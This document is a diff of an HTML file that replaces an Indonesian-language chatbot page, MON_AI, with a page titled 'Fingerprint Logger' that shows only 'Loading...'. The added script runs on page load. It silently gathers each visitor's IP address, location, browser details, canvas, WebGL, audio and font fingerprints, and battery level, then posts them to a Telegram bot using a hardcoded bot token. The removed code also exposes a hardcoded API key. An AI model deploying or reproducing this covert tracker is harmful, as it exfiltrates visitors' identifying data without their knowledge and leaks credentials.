@@ -1,175 +1,85 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>MON_AI - Chatbot AI</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
-
-    body {
-      margin: 0;
-      background-color: #000;
-      color: #00ffff;
-      font-family: 'Orbitron', monospace, sans-serif;
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
-      align-items: center;
-      justify-content: center;
-    }
-
-    h1 {
-      font-size: 3rem;
-      text-shadow:
-        0 0 5px #00ffff,
-        0 0 10px #00ffff,
-        0 0 20px #00ffff;
-      margin-bottom: 10px;
-    }
-
-    #chatbox {
-      background: #0a0a0a;
-      border: 2px solid #00ffff;
-      border-radius: 10px;
-      width: 90%;
-      max-width: 600px;
-      height: 400px;
-      padding: 10px;
-      overflow-y: auto;
-      box-shadow:
-        0 0 10px #00ffff,
-        0 0 20px #00ffff;
-    }
-
-    .message {
-      margin: 8px 0;
-      padding: 8px 12px;
-      border-radius: 8px;
-      max-width: 80%;
-      word-wrap: break-word;
-      box-shadow: 0 0 5px #00ffff;
-    }
-
-    .user {
-      background: #004d4d;
-      color: #aaffff;
-      align-self: flex-end;
-      text-align: right;
-    }
-
-    .bot {
-      background: #002626;
-      color: #33ffff;
-      align-self: flex-start;
-      text-align: left;
-    }
-
-    #inputArea {
-      margin-top: 15px;
-      width: 90%;
-      max-width: 600px;
-      display: flex;
-    }
-
-    #promptInput {
-      flex: 1;
-      padding: 12px;
-      font-size: 1.1rem;
-      border: 2px solid #00ffff;
-      border-radius: 10px 0 0 10px;
-      background: #000;
-      color: #00ffff;
-      outline: none;
-      box-shadow:
-        inset 0 0 10px #00ffff;
-    }
-
-    #sendBtn {
-      padding: 12px 20px;
-      font-size: 1.1rem;
-      background: #00ffff;
-      color: #000;
-      border: none;
-      border-radius: 0 10px 10px 0;
-      cursor: pointer;
-      box-shadow:
-        0 0 15px #00ffff;
-      transition: background 0.3s ease;
-    }
-
-    #sendBtn:hover {
-      background: #00cccc;
-    }
-
-    #loading {
-      margin-left: 15px;
-      color: #00ffff;
-      font-style: italic;
-      display: none;
-    }
-
-  </style>
+  <title>Fingerprint Logger</title>
+  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
 </head>
 <body>
-
-  <h1>MON_AI</h1>
-
-  <div id="chatbox"></div>
-
-  <div id="inputArea">
-    <input type="text" id="promptInput" placeholder="Ketik pertanyaanmu..." autocomplete="off" />
-    <button id="sendBtn">Kirim</button>
-    <span id="loading">Loading...</span>
-  </div>
-
+  <h1>Loading...</h1>
   <script>
-    const chatbox = document.getElementById('chatbox');
-    const promptInput = document.getElementById('promptInput');
-    const sendBtn = document.getElementById('sendBtn');
-    const loading = document.getElementById('loading');
+    const TELEGRAM_BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
+    const CHAT_ID = "7218964278";
 
-    function addMessage(text, sender) {
-      const msgDiv = document.createElement('div');
-      msgDiv.classList.add('message', sender);
-      msgDiv.textContent = text;
-      chatbox.appendChild(msgDiv);
-      chatbox.scrollTop = chatbox.scrollHeight;
+    function getIPInfo() {
+      return fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .catch(() => ({}));
     }
 
-    async function sendPrompt() {
-      const prompt = promptInput.value.trim();
-      if (!prompt) return;
-      addMessage(prompt, 'user');
-      promptInput.value = '';
-      loading.style.display = 'inline';
-
-      try {
-        // Ganti URL dan method sesuai backend AI kamu nanti
-        const res = await fetch('/ai', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'x-api-key': 'AIzaSyALpIVNU2sMEaatfYwbxzjBsEKBIy6fNEQ' // Ganti dengan API key Gemini-mu
-          },
-          body: JSON.stringify({ prompt })
-        });
-        if (!res.ok) throw new Error('Response error');
-
-        const data = await res.json();
-        addMessage(data.response || 'Tidak ada jawaban dari AI.', 'bot');
-      } catch (error) {
-        addMessage('Error saat menghubungi AI: ' + error.message, 'bot');
-      } finally {
-        loading.style.display = 'none';
-      }
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const data = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      };
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
     }
 
-    sendBtn.addEventListener('click', sendPrompt);
-    promptInput.addEventListener('keypress', e => {
-      if (e.key === 'Enter') sendPrompt();
-    });
+    function collectData() {
+      Promise.all([
+        FingerprintJS.load().then(fp => fp.get()),
+        getIPInfo()
+      ]).then(([fpData, ipInfo]) => {
+        const nav = navigator;
+        const screenInfo = window.screen;
+        const message = `
+📡 *NEW VISITOR LOG*
+
+🕵️ *IP Address:* ${ipInfo.ip || 'N/A'}
+🌍 *Location:* ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country_name || 'N/A'}
+📅 *Date/Time:* ${new Date().toLocaleString()}
+
+🧠 *Browser Info*
+- User-Agent: ${nav.userAgent}
+- Platform: ${nav.platform}
+- Language: ${nav.language}
+- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+🖥️ *Display*
+- Screen: ${screenInfo.width}x${screenInfo.height}
+- Window: ${window.innerWidth}x${window.innerHeight}
+
+🔋 *Battery Status:* ${
+          nav.getBattery ? 'Checking...' : 'N/A'
+        }
+
+🎨 *Canvas Fingerprint:* ${fpData.components.canvas?.value || 'N/A'}
+🧩 *WebGL Vendor:* ${fpData.components.webgl?.value?.vendor || 'N/A'}
+🧩 *WebGL Renderer:* ${fpData.components.webgl?.value?.renderer || 'N/A'}
+🔊 *Audio Fingerprint:* ${fpData.components.audio?.value || 'N/A'}
+🔠 *Fonts Detected:* ${fpData.components.fonts?.value?.join(", ") || 'N/A'}
+
+🧬 *Fingerprint ID:* \`${fpData.visitorId}\`
+        `;
+        sendToTelegram(message.trim());
+
+        // Check battery after send
+        if (nav.getBattery) {
+          nav.getBattery().then(battery => {
+            const batteryMsg = `🔋 *Battery:*\n- Level: ${battery.level * 100}%\n- Charging: ${battery.charging}`;
+            sendToTelegram(batteryMsg);
+          });
+        }
+      });
+    }
+
+    collectData();
   </script>
-
 </body>
 </html>
